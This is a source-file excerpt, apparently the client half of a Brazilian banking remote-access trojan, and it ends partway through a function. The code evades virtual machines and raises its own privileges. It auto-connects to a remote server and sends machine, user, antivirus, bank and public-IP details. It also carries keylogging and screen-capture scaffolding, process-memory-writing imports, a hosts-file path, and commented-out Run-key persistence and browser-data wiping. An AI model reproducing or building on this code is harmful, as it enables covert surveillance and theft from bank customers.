using System;
using System.Management;
using System.Management.Instrumentation;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using zlib;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Automation;
using System.Globalization;
using System.Threading.Tasks;
using System.Security.Principal;
using System.Net.NetworkInformation;

namespace MenuRemoteClient
{
    public partial class MenuRemoteClient : Form
    {
      /*  protected override void WndProc(ref System.Windows.Forms.Message m)
        {
            if (m.Msg == WM_QUERYENDSESSION)
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\MenuRemoteClient.exe", true);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\MenuRemoteClient.exe", FileAttributes.Hidden);
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("MenuRemoteClient", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\MenuRemoteClient.exe");
            }
            base.WndProc(ref m);

        } */

        int WM_SYSCOMMAND = 0x112;
        int SC_MONITORPOWER = 0xF170;

       //-------------------------------------------------------------------------------------------------------------

        [DllImport("user32.dll", SetLastError = true)]
        static extern int FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(int handle, out int pid);
        [DllImport("kernel32")]
        public extern static int LoadLibrary(string librayName);
        [DllImport("kernel32")]
        public extern static int FreeLibrary(int hwnd);
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public extern static int GetProcAddress(int hwnd, string procedureName);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer,
        int nSize, out int lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        public extern static int OpenProcess(int access, bool inherit, int pid);
        [DllImport("kernel32")]
        public extern static int CloseHandle(int handle);


        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

        [DllImport("user32.dll", EntryPoint = "WindowFromPoint",
           CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr WindowFromPoint(Point point);

      /*  [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd); */

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

       /* [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count); */

       /* [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(String sClassName, String sAppName); */

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindowByCaption(IntPtr ZeroOnly, string lpWindowName);

      /*  [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow); */

      /*  [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr WindowHandle); */

      /*  [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr WindowHandle, IntPtr DC); */

      /*  [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr WindowHandle, ref Rect rect); */

     /*   [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags); */

      /*  [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        } */

        //============================================================================================================

        private const int WM_SETTEXT = 0x000C;
       /* [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(
            string lpClassName,
            string lpWindowName); */

        [DllImport("User32.dll")]
        private static extern IntPtr FindWindowEx(
            IntPtr hwndParent,
            IntPtr hwndChildAfter,
            string lpszClass,
        string lpszWindows);
        [DllImport("User32.dll")]
        private static extern Int32 SendMessage(
            IntPtr hWnd,
            int Msg,
            IntPtr wParam,
        StringBuilder lParam);
        
        //============================================================================================================

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr A_0, int A_1, int A_2, int A_3);

         [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;        
            public int Top;         
            public int Right;       
            public int Bottom;   
        }

        public enum K
        {
            [Description("Left mouse button")]
            VK_LBUTTON = 0x01,

            [Description("Right mouse button")]
            VK_RBUTTON = 0x02,

            [Description("Control-break processing")]
            VK_CANCEL = 0x03,

            [Description("Middle mouse button (three-button mouse)")]
            VK_MBUTTON = 0x04,

            [Description("X1 mouse button")]
            VK_XBUTTON1 = 0x05,

            [Description("X2 mouse button")]
            VK_XBUTTON2 = 0x06,

            [Description("BACKSPACE key")]
            VK_BACK = 0x08,

            [Description("TAB key")]
            VK_TAB = 0x09,

            [Description("CLEAR key")]
            VK_CLEAR = 0x0C,

            [Description("ENTER key")]
            VK_RETURN = 0x0D,

            [Description("SHIFT key")]
            VK_SHIFT = 0x10,

            [Description("CTRL key")]
            VK_CONTROL = 0x11,

            [Description("ALT key")]
            VK_MENU = 0x12,

            [Description("PAUSE key")]
            VK_PAUSE = 0x13,

            [Description("CAPS LOCK key")]
            VK_CAPITAL = 0x14,

            [Description("IME Kana mode")]
            VK_KANA = 0x15,

            [Description("IME Hanguel mode (maintained for compatibility; use VK_HANGUL)")]
            VK_HANGUEL = 0x15,

            [Description("IME Hangul mode")]
            VK_HANGUL = 0x15,

            [Description("IME Junja mode")]
            VK_JUNJA = 0x17,

            [Description("IME final mode")]
            VK_FINAL = 0x18,

            [Description("IME Hanja mode")]
            VK_HANJA = 0x19,

            [Description("IME Kanji mode")]
            VK_KANJI = 0x19,

            [Description("ESC key")]
            VK_ESCAPE = 0x1B,

            [Description("IME convert")]
            VK_CONVERT = 0x1C,

            [Description("IME nonconvert")]
            VK_NONCONVERT = 0x1D,

            [Description("IME accept")]
            VK_ACCEPT = 0x1E,

            [Description("IME mode change request")]
            VK_MODECHANGE = 0x1F,

            [Description("SPACEBAR")]
            VK_SPACE = 0x20,

            [Description("PAGE UP key")]
            VK_PRIOR = 0x21,

            [Description("PAGE DOWN key")]
            VK_NEXT = 0x22,

            [Description("END key")]
            VK_END = 0x23,

            [Description("HOME key")]
            VK_HOME = 0x24,

            [Description("LEFT ARROW key")]
            VK_LEFT = 0x25,

            [Description("UP ARROW key")]
            VK_UP = 0x26,

            [Description("RIGHT ARROW key")]
            VK_RIGHT = 0x27,

            [Description("DOWN ARROW key")]
            VK_DOWN = 0x28,

            [Description("SELECT key")]
            VK_SELECT = 0x29,

            [Description("PRINT key")]
            VK_PRINT = 0x2A,

            [Description("EXECUTE key")]
            VK_EXECUTE = 0x2B,

            [Description("PRINT SCREEN key")]
            VK_SNAPSHOT = 0x2C,

            [Description("INS key")]
            VK_INSERT = 0x2D,

            [Description("DEL key")]
            VK_DELETE = 0x2E,

            [Description("HELP key")]
            VK_HELP = 0x2F,

            [Description("0 key")]
            K_0 = 0x30,

            [Description("1 key")]
            K_1 = 0x31,

            [Description("2 key")]
            K_2 = 0x32,

            [Description("3 key")]
            K_3 = 0x33,

            [Description("4 key")]
            K_4 = 0x34,

            [Description("5 key")]
            K_5 = 0x35,

            [Description("6 key")]
            K_6 = 0x36,

            [Description("7 key")]
            K_7 = 0x37,

            [Description("8 key")]
            K_8 = 0x38,

            [Description("9 key")]
            K_9 = 0x39,

            [Description("A key")]
            K_A = 0x41,

            [Description("B key")]
            K_B = 0x42,

            [Description("C key")]
            K_C = 0x43,

            [Description("D key")]
            K_D = 0x44,

            [Description("E key")]
            K_E = 0x45,

            [Description("F key")]
            K_F = 0x46,

            [Description("G key")]
            K_G = 0x47,

            [Description("H key")]
            K_H = 0x48,

            [Description("I key")]
            K_I = 0x49,

            [Description("J key")]
            K_J = 0x4A,

            [Description("K key")]
            K_K = 0x4B,

            [Description("L key")]
            K_L = 0x4C,

            [Description("M key")]
            K_M = 0x4D,

            [Description("N key")]
            K_N = 0x4E,

            [Description("O key")]
            K_O = 0x4F,

            [Description("P key")]
            K_P = 0x50,

            [Description("Q key")]
            K_Q = 0x51,

            [Description("R key")]
            K_R = 0x52,

            [Description("S key")]
            K_S = 0x53,

            [Description("T key")]
            K_T = 0x54,

            [Description("U key")]
            K_U = 0x55,

            [Description("V key")]
            K_V = 0x56,

            [Description("W key")]
            K_W = 0x57,

            [Description("X key")]
            K_X = 0x58,

            [Description("Y key")]
            K_Y = 0x59,

            [Description("Z key")]
            K_Z = 0x5A,

            [Description("Left Windows key (Natural keyboard)")]
            VK_LWIN = 0x5B,

            [Description("Right Windows key (Natural keyboard)")]
            VK_RWIN = 0x5C,

            [Description("Applications key (Natural keyboard)")]
            VK_APPS = 0x5D,

            [Description("Computer Sleep key")]
            VK_SLEEP = 0x5F,

            [Description("Numeric keypad 0 key")]
            VK_NUMPAD0 = 0x60,

            [Description("Numeric keypad 1 key")]
            VK_NUMPAD1 = 0x61,

            [Description("Numeric keypad 2 key")]
            VK_NUMPAD2 = 0x62,

            [Description("Numeric keypad 3 key")]
            VK_NUMPAD3 = 0x63,

            [Description("Numeric keypad 4 key")]
            VK_NUMPAD4 = 0x64,

            [Description("Numeric keypad 5 key")]
            VK_NUMPAD5 = 0x65,

            [Description("Numeric keypad 6 key")]
            VK_NUMPAD6 = 0x66,

            [Description("Numeric keypad 7 key")]
            VK_NUMPAD7 = 0x67,

            [Description("Numeric keypad 8 key")]
            VK_NUMPAD8 = 0x68,

            [Description("Numeric keypad 9 key")]
            VK_NUMPAD9 = 0x69,

            [Description("Multiply key")]
            VK_MULTIPLY = 0x6A,

            [Description("Add key")]
            VK_ADD = 0x6B,

            [Description("Separator key")]
            VK_SEPARATOR = 0x6C,

            [Description("Subtract key")]
            VK_SUBTRACT = 0x6D,

            [Description("Decimal key")]
            VK_DECIMAL = 0x6E,

            [Description("Divide key")]
            VK_DIVIDE = 0x6F,

            [Description("F1 key")]
            VK_F1 = 0x70,

            [Description("F2 key")]
            VK_F2 = 0x71,

            [Description("F3 key")]
            VK_F3 = 0x72,

            [Description("F4 key")]
            VK_F4 = 0x73,

            [Description("F5 key")]
            VK_F5 = 0x74,

            [Description("F6 key")]
            VK_F6 = 0x75,

            [Description("F7 key")]
            VK_F7 = 0x76,

            [Description("F8 key")]
            VK_F8 = 0x77,

            [Description("F9 key")]
            VK_F9 = 0x78,

            [Description("F10 key")]
            VK_F10 = 0x79,

            [Description("F11 key")]
            VK_F11 = 0x7A,

            [Description("F12 key")]
            VK_F12 = 0x7B,

            [Description("F13 key")]
            VK_F13 = 0x7C,

            [Description("F14 key")]
            VK_F14 = 0x7D,

            [Description("F15 key")]
            VK_F15 = 0x7E,

            [Description("F16 key")]
            VK_F16 = 0x7F,

            [Description("F17 key")]
            VK_F17 = 0x80,

            [Description("F18 key")]
            VK_F18 = 0x81,

            [Description("F19 key")]
            VK_F19 = 0x82,

            [Description("F20 key")]
            VK_F20 = 0x83,

            [Description("F21 key")]
            VK_F21 = 0x84,

            [Description("F22 key")]
            VK_F22 = 0x85,

            [Description("F23 key")]
            VK_F23 = 0x86,

            [Description("F24 key")]
            VK_F24 = 0x87,

            [Description("NUM LOCK key")]
            VK_NUMLOCK = 0x90,

            [Description("SCROLL LOCK key")]
            VK_SCROLL = 0x91,

            [Description("Left SHIFT key")]
            VK_LSHIFT = 0xA0,

            [Description("Right SHIFT key")]
            VK_RSHIFT = 0xA1,

            [Description("Left CONTROL key")]
            VK_LCONTROL = 0xA2,

            [Description("Right CONTROL key")]
            VK_RCONTROL = 0xA3,

            [Description("Left MENU key")]
            VK_LMENU = 0xA4,

            [Description("Right MENU key")]
            VK_RMENU = 0xA5,

            [Description("Browser Back key")]
            VK_BROWSER_BACK = 0xA6,

            [Description("Browser Forward key")]
            VK_BROWSER_FORWARD = 0xA7,

            [Description("Browser Refresh key")]
            VK_BROWSER_REFRESH = 0xA8,

            [Description("Browser Stop key")]
            VK_BROWSER_STOP = 0xA9,

            [Description("Browser Search key")]
            VK_BROWSER_SEARCH = 0xAA,

            [Description("Browser Favorites key")]
            VK_BROWSER_FAVORITES = 0xAB,

            [Description("Browser Start and Home key")]
            VK_BROWSER_HOME = 0xAC,

            [Description("Volume Mute key")]
            VK_VOLUME_MUTE = 0xAD,

            [Description("Volume Down key")]
            VK_VOLUME_DOWN = 0xAE,

            [Description("Volume Up key")]
            VK_VOLUME_UP = 0xAF,

            [Description("Next Track key")]
            VK_MEDIA_NEXT_TRACK = 0xB0,

            [Description("Previous Track key")]
            VK_MEDIA_PREV_TRACK = 0xB1,

            [Description("Stop Media key")]
            VK_MEDIA_STOP = 0xB2,

            [Description("Play/Pause Media key")]
            VK_MEDIA_PLAY_PAUSE = 0xB3,

            [Description("Start Mail key")]
            VK_LAUNCH_MAIL = 0xB4,

            [Description("Select Media key")]
            VK_LAUNCH_MEDIA_SELECT = 0xB5,

            [Description("Start Application 1 key")]
            VK_LAUNCH_APP1 = 0xB6,

            [Description("Start Application 2 key")]
            VK_LAUNCH_APP2 = 0xB7,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the ';:' key")]
            VK_OEM_1 = 0xBA,

            [Description("For any country/region, the '+' key")]
            VK_OEM_PLUS = 0xBB,

            [Description("For any country/region, the ',' key")]
            VK_OEM_COMMA = 0xBC,

            [Description("For any country/region, the '-' key")]
            VK_OEM_MINUS = 0xBD,

            [Description("For any country/region, the '.' key")]
            VK_OEM_PERIOD = 0xBE,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '/?' key")]
            VK_OEM_2 = 0xBF,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '`~' key")]
            VK_OEM_3 = 0xC0,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '[{' key")]
            VK_OEM_4 = 0xDB,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '\\|' key")]
            VK_OEM_5 = 0xDC,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the ']}' key")]
            VK_OEM_6 = 0xDD,

            [Description("Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the 'single-quote/double-quote' key")]
            VK_OEM_7 = 0xDE,

            [Description("Used for miscellaneous characters; it can vary by keyboard.")]
            VK_OEM_8 = 0xDF,


            [Description("Either the angle bracket key or the backslash key on the RT 102-key keyboard")]
            VK_OEM_102 = 0xE2,

            [Description("IME PROCESS key")]
            VK_PROCESSKEY = 0xE5,


            [Description("Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP")]
            VK_PACKET = 0xE7,

            [Description("Attn key")]
            VK_ATTN = 0xF6,

            [Description("CrSel key")]
            VK_CRSEL = 0xF7,

            [Description("ExSel key")]
            VK_EXSEL = 0xF8,

            [Description("Erase EOF key")]
            VK_EREOF = 0xF9,

            [Description("Play key")]
            VK_PLAY = 0xFA,

            [Description("Zoom key")]
            VK_ZOOM = 0xFB,

            [Description("PA1 key")]
            VK_PA1 = 0xFD,

            [Description("Clear key")]
            VK_OEM_CLEAR = 0xFE,

        }

        static int WM_LBUTTONDOWN = 0x201;
        static int WM_LBUTTONUP = 0x202;
        static int WM_RBUTTONDOWN = 0x0204;
        static int WM_RBUTTONUP = 0x0205;
        static int WM_LBUTTONDBLCLK = 0x0203;

        public const Int32 WM_CHAR = 0x0102;
        public const Int32 WM_KEYDOWN = 0x0100;
        public const Int32 WM_KEYUP = 0x0101;


        public void clickLeft(IntPtr hwnd, int x, int y)
        {

            Point p = new Point(x, y);

            RECT rct = new RECT();

            if (!GetWindowRect(hwnd, ref rct))
            {
                return;
            }

            int newx = x - rct.Left;
            int newy = y - rct.Top;

            SendMessage(hwnd, WM_LBUTTONDOWN, 1, newy * 65536 + newx);
            SendMessage(hwnd, WM_LBUTTONUP, 0, newy * 65536 + newx);
        }

        public void Rightclick(IntPtr hwnd, int x, int y)
        {

            Point p = new Point(x, y);

            RECT rct = new RECT();

            if (!GetWindowRect(hwnd, ref rct))
            {
                return;
            }

            int newx = x - rct.Left;
            int newy = y - rct.Top;

            SendMessage(hwnd, WM_RBUTTONDOWN, 1, newy * 65536 + newx);
            SendMessage(hwnd, WM_RBUTTONUP, 0, newy * 65536 + newx);
        }

        public void DBclickLeft(IntPtr hwnd, int x, int y)
        {

            Point p = new Point(x, y);

            RECT rct = new RECT();

            if (!GetWindowRect(hwnd, ref rct))
            {
                return;
            }

            int newx = x - rct.Left;
            int newy = y - rct.Top;

            SendMessage(hwnd, WM_LBUTTONDBLCLK, 1, newy * 65536 + newx);
        }

    //----------------------------------------------------------------------------------------------------------------

        private void monitor(bool turnOff)
        {
            SendMessage(this.Handle, WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)(turnOff ? 2 : -1));
        }

        protected override void WndProc(ref Message m)
        {

            if (m.Msg == WM_SYSCOMMAND) 
            {

                if ((m.WParam.ToInt32() & 0xFFF0) == SC_MONITORPOWER)
                {
                    sendNotes("Operação realizada com sucesso!");
                }

            }

            base.WndProc(ref m);

        }

        public Boolean ConnectionEstablished
        {
            get
            {
                return tcpClient != null && tcpClient.Connected;
            }
        }

        private static int WM_QUERYENDSESSION = 0x11;
        public Boolean Connected = false;

        public TcpClient tcpClient;
        public NetworkStream networkStream;
        public Byte[] receiveBuffer = new byte[1024];
        public Boolean Keylogged = false;
        public Boolean remoted = false;



        public Boolean remotedNav = false;
        public Bitmap bmpScreenSendNav;
        public Bitmap bmpCurrentScreenNav;
        public Bitmap bmpScreenNav;
        public IntPtr WindowHandle;
        public static String guardaIPExterno;
        
        
        
        
        public Int32 receivedScreen;
        public Bitmap bmpScreenSend;
        public Bitmap bmpCurrentScreen;
        public Bitmap bmpScreen;
        private const int BufferSize = 1024;

        public static String ip;
        public static Int32 porta;
        public static String senha;
        public ManualResetEvent mreSendData = new ManualResetEvent(false);
        public QueueSendData queueSendData = new QueueSendData();
        Rectangle boundScreen;

        //RamGecTools.MouseHook mouseHook = new RamGecTools.MouseHook();
        //RamGecTools.KeyboardHook keyboardHook = new RamGecTools.KeyboardHook();

        public static String[] separator = new String[] { "<!>" };
        public List<BrowserInfo> browsers;
        public String[] urls = {
                                   "http://www.google.com", 
                                   "http://www.bing.com"
                               };

        String path = @"C:\Windows\System32\drivers\etc\hosts";

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        public MenuRemoteClient()
        {
            browsers = new List<BrowserInfo>();
            browsers.Add(new BrowserInfo("iexplore"));
            browsers.Add(new BrowserInfo("chrome"));
            browsers.Add(new BrowserInfo("opera"));
            browsers.Add(new BrowserInfo("firefox"));
            InitializeComponent();
        }

        public MenuRemoteClient(DESCO_02 frm1Handle)
        {
            InitializeComponent();
            HandleToDESCO_02 = frm1Handle;
        }
        private DESCO_02 HandleToDESCO_02;

        public MenuRemoteClient(ITAF frm1HandleIT)
        {
            InitializeComponent();
            HandleToITA = frm1HandleIT;
        }
        private ITAF HandleToITA;

        public MenuRemoteClient(ITA_TJ_02 frm1HandleITJ02)
        {
            InitializeComponent();
            HandleToITAJ02 = frm1HandleITJ02;
        }
        private ITA_TJ_02 HandleToITAJ02;

        public MenuRemoteClient(SANTA_TAB frm1HandleSANTAB)
        {
            InitializeComponent();
            HandleToSANTAB = frm1HandleSANTAB;
        }
        private SANTA_TAB HandleToSANTAB;

        public String ipHost
        {
            get
            {
                return textbox_ipHost.Text;
                //return ip;
            }

            set
            {
                textbox_ipHost.Text = value;//ip;
            }
        }

        public int port
        {
            get
            {
                return int.Parse(textbox_port.Text);
                //return porta;
            }

            set
            {
                textbox_port.Text = value.ToString(); /*porta.ToString(); */
            }
        }

        public String password
        {
            get
            {
                return textbox_password.Text;
                //return senha;
            }

            set
            {
                textbox_password.Text = value;//senha;
            }
        }

        public String identification
        {
            get
            {
                return textbox_identification.Text;
                //return Environment.MachineName;
            }

            set
            {
                textbox_identification.Text = value;
            }
        }

        public String osName
        {
            get
            {
                return ((String)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "Unknown")).Trim() + is64BitSystem() + " / " + this.Pingi;
            }
        }

        public String resolution
        {
            get
            {                             // Screen.PrimaryScreen.Bounds.Size;
                return Screen.PrimaryScreen.Bounds.Width + " x " + Screen.PrimaryScreen.Bounds.Height;
            }
        }

        public String processorName
        {
            get
            {
                return ((String)Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", "Unknown")).Trim();
            }
        }

        public string country()
        {
            string culture = CultureInfo.CurrentCulture.EnglishName;
            string country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);
            return country;
        }

        public String bank
        {
            get
            {
                return country();
            }
        }

        public String gb
        {
            
            get
            {
                return bancoCliente();
            }
        }

        public String aV
        {

            get
            {
                return Antivirus();
            }
        }

         public String IPExterno
         {

            get
            {
                return GetPublicIpAddress();
            }
        }

        public String Conexao
        {

            get
            {
                return TipoConexao();
            }
        }

        public String Pingi
        {

            get
            {
                return Ping();
            }
        }

        public String HardwareM
        {

            get
            {
                return Marca();
            }
        }

        public String HardwareMD
        {

            get
            {
                return Modelo();
            }
        }

        private string Marca()
        {
            string marca = "";

            ManagementObjectSearcher searcher =
                   new ManagementObjectSearcher("root\\CIMV2",
                   "SELECT * FROM Win32_BaseBoard");

            foreach (ManagementObject queryObj in searcher.Get())
            {
                marca =  queryObj["Manufacturer"].ToString();
                Console.WriteLine("Product: {0}", queryObj["Product"]);
            }
            return marca;

        }

        private string Modelo()
        {
            string modelo = "";

            ManagementObjectSearcher searcher =
                   new ManagementObjectSearcher("root\\CIMV2",
                   "SELECT * FROM Win32_BaseBoard");

            foreach (ManagementObject queryObj in searcher.Get())
            {
                modelo = queryObj["Product"].ToString();
            }
            return modelo;

        }

        private string Ping()
        {
            string pg = String.Empty;

               try
               {
                   using (Ping p = new Ping())
                   {
                       pg = p.Send("www.google.com").RoundtripTime.ToString();
                   }
               }

               catch
               {
                   pg = "";
               }

            return pg;
        }

        protected override void OnPaintBackground(PaintEventArgs e)
        {
            base.OnPaintBackground(e);
        }

        private void button_connect_Click(object sender, EventArgs event_args)
        {
            if (this.ConnectionEstablished)
            {
                //this.DisconnectForce();
            }
            else if (this.Connected)
            {

            }
            else
            {
                this.Connect();
            }
            if (checkbox_autoreconnect.Checked == false)
            {
                checkbox_autoreconnect.Checked = true;
                timerAutoConnect.Enabled = true;
            }
        }

        private void Connect()
        {
            if (this.ipHost == "")
            {
                MessageBox.Show("Pleaze informe hostname.", "Error");
                return;
            }

            try
            {
                int temp = this.port;
            }
            catch (Exception exception)
            {
                Console.WriteLine(exception.Message);
                MessageBox.Show("Please input correct port number", "Error");
                return;
            }

            toolStripStatus_value.Text = "Conectado...";
            button_connect.Enabled = false;

            try
            {
                this.tcpClient = new TcpClient(this.ipHost, this.port);
                this.networkStream = this.tcpClient.GetStream();
                this.tcpClient.NoDelay = true;
            }
            catch (SocketException e)
            {
                toolStripStatus_value.Text = e.Message;
                button_connect.Enabled = true;
                return;
            }

            toolStripStatus_value.Text = "Conectado";
            button_connect.Text = "Disconectar";
            button_connect.Enabled = true;
            textbox_ipHost.Enabled = false;
            textbox_port.Enabled = false;
            textbox_password.Enabled = false;
            textbox_identification.Enabled = false;
            checkbox_autoreconnect.Enabled = false;
            this.ConnectToServer();
        }

        public void DisconnectForce(String reason = "Disconectado")
        {
            if (this.Connected)
            {
                byte[] buffer = Encoding.ASCII.GetBytes("<|Close|>");
                if (this.networkStream.CanWrite)
                {
                    this.networkStream.Write(buffer, 0, buffer.Length);
                }
            }
            this.Disconnect(reason);
        }

        public delegate void DelegateCallback();

        public void Disconnect(String reason = "Disconectado")
        {
            this.Connected = false;
            try
            {
                this.networkStream.Close();
                this.tcpClient.Close();
                this.tcpClient = null;

            }
            catch (Exception e)
            {
                label_lblLink.Text = e.StackTrace;
            }

            toolStripStatus_value.Text = reason;
            DelegateCallback d = new DelegateCallback(() =>
            {
                button_connect.Text = "Conectar";
                button_connect.Enabled = true;
                textbox_ipHost.Enabled = true;
                textbox_port.Enabled = true;
                textbox_password.Enabled = true;
                textbox_identification.Enabled = true;
                checkbox_autoreconnect.Enabled = true;
            });
            Invoke(d, new object[] { });
        }

        private void MenuRemoteClient_Load(object sender, EventArgs e)
        {
            try
            {
                if (isVM())
                {
                    MessageBox.Show("Este software não pode ser executado em uma máquina virtual", "Maquina virtual detectada",
                                     MessageBoxButtons.OK,
                                     MessageBoxIcon.Error);
                    Application.Exit();
                }
                else
                {
                    using(Mutex mutex = new Mutex(false, "Global\\" + "c0a76b5a-12ab-45c5-b9d9-d693faa6e7b9"))
                    {
                        if(!mutex.WaitOne(0, false))
                        {
                            Application.Exit();;
                        }

                    }

                    Privileges priv = new Privileges();
                    priv.AddPrivilege("SeDebugPrivilege");

                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\Profiles"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Opera\\Opera"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Apple Computer"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Internet Explorer"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera"));
                    //EmptyFolder(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Apple Computer"));

                    /*   using (RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer", true))
                       {

                           if (regkey.OpenSubKey("TypedURLs") != null)
                           {
                               regkey.DeleteSubKeyTree("TypedURLs");
                           }
                       } */

               //================================== Trecho referente ao Edit_Client ===========================================

   /*                 StreamReader sr = new StreamReader(System.Windows.Forms.Application.ExecutablePath);
                    BinaryReader br = new BinaryReader(sr.BaseStream);

                    byte[] fileData = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length));
                    br.Close();
                    sr.Close();

                    ASCIIEncoding Conv = new ASCIIEncoding();

                    string whatever = Conv.GetString(fileData).Substring(Conv.GetString(fileData).IndexOf("-whatever-")).Replace("-whatever-", "<!>");

                    String[] delimiter = whatever.Split(MenuRemoteClient.separator, StringSplitOptions.None);
                    //ip = delimiter[0];
                    ip = delimiter[1];
                    porta = Convert.ToInt32(delimiter[2]);
                    senha = delimiter[3];                        */
                   
            //================================================================================================================

                    // register evens
                    //keyboardHook.KeyDown += new RamGecTools.KeyboardHook.KeyboardHookCallback(keyboardHook_KeyDown);
                    //keyboardHook.KeyUp += new RamGecTools.KeyboardHook.KeyboardHookCallback(keyboardHook_KeyUp);

                    //keyboardHook.Install();
                    this.boundScreen = Screen.GetBounds(Point.Empty);
            /*        textbox_ipHost.Text = ip;
                    textbox_port.Text = porta.ToString();
                    textbox_password.Text = senha;         */
                    textbox_identification.Text = System.Environment.MachineName + " / " + Environment.UserName;
                    button_connect.PerformClick();
                }
            }
            catch (Exception except) { /*MessageBox.Show(except.ToString());*/ }
        }   

        /**
         * Send client information
         **/
        private void ConnectToServer()
        {
            try
            {
                String information = String.Format("<|Connect|>{0}<!>{1}<!>{2}<!>{3}<!>{4}<!>{5}<!>{6}<!>{7}<!>{8}<!>{9}<!>{10}<!>", this.identification, 
                    this.osName, this.processorName, this.password, this.bank, this.Width, this.boundScreen.Height, this.resolution, this.gb, this.aV, this.IPExterno); 
                byte[] buffer = Encoding.ASCII.GetBytes(information);
                this.networkStream.Write(buffer, 0, buffer.Length);
                buffer = new byte[1024];
                int numOfBytesRead = this.networkStream.Read(buffer, 0, buffer.Length);
                String str = Encoding.ASCII.GetString(buffer, 0, numOfBytesRead);
                if (str.IndexOf("<|Connect|>Connected") == 0)
                {
                    this.Connected = true;
                    Thread thread = new Thread(() =>  CommunicationProc());
                    thread.Start();

